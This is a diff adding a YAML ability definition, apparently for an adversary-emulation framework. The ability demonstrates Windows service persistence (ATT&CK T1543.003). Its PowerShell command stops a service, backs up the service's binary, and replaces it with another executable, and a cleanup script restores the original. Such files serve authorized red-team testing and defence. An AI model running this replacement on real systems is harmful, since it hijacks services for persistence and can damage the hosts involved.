@@ -1,0 +1,32 @@
+---
+
+- id: 52771610-2322-44cf-816b-a7df42b4c086
+  name: Replace a service binary with alternate binary
+  description: |
+    This is an example technique. snmptrap.exe should be changed in the command
+    below with the new desired service binary. Depending on the value of
+    host.service.modifiable this ability can damage the target system.
+  tactic: persistence
+  technique:
+    attack_id: T1543.003
+    name: "Create or Modify System Process: Windows Service"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $s = Get-Service -Name #{host.service.modifiable};
+          if ($s.status -ne 'Stopped') { Stop-Service $s };
+          $exe = (Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\#{host.service.modifiable}").ImagePath.split()[0];
+          $path = (Resolve-Path $exe).Path;
+          Copy-Item -Path $path -Destination ($path + ".saved");
+          Copy-Item -Path "C:\Windows\System32\snmptrap.exe" -Destination $path
+        cleanup: |
+          $exe = (Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\#{host.service.modifiable}").ImagePath.split()[0];
+          $path = (Resolve-Path $exe).Path;
+          If (Test-Path ($path + ".saved")) {
+            Remove-Item $path;
+            Move-Item -Path ($path + ".saved") -Destination $path
+          }
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+      - source: host.service.modifiable
